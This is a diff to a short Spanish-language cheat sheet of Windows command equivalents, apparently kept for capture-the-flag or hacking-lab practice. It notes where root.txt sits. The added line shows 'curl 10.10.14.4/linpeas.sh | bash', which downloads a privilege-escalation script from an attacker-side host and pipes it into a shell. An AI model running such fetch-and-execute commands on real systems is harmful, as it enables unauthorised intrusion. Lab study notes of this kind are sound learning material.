@@ -7,6 +7,7 @@ CAT en windows es TYPE
 WGET en windows es WGET nombredelarchivooriginal -OUTFILE nombrequequieras
 En windows mirar carpetas ocultas no es -la es ls -force
 La root.txt en windows se encuentra en /users/Administrator/Desktop
+CURL es lo mismo que WGET ej: curl 10.10.14.4/linpeas.sh | bash
 ```
 ### WINDOWS
 ```
